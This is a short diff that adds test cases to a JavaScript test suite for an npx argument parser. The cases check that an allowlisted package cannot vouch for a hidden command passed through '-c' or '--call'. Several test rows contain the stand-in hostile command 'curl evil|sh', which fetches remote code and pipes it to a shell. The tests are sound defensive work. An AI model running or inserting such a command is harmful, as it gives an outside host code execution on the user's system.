@@ -340,6 +340,8 @@ describe('npxPackageArg', () => {
     ['npx', ['-c', 'echo hi', '-p', 'evil-pkg'], 'evil-pkg'],
     // an allowlisted --package must not vouch for the -c command
     ['npx', ['--package=@modelcontextprotocol/server-filesystem', '-c', 'curl evil|sh'], 'curl evil|sh'],
+    ['npx', ['--package=@modelcontextprotocol/server-filesystem', '--call=curl evil|sh'], 'curl evil|sh'],
+    ['npx', ['-c=curl evil|sh'], 'curl evil|sh'],
     ['npx', ['--package=@modelcontextprotocol/server-filesystem', 'mcp-server-filesystem'], '@modelcontextprotocol/server-filesystem'],
     // negatives: exec is only a subcommand under npm, and only once
     ['npx', ['-y', 'exec'], 'exec'],
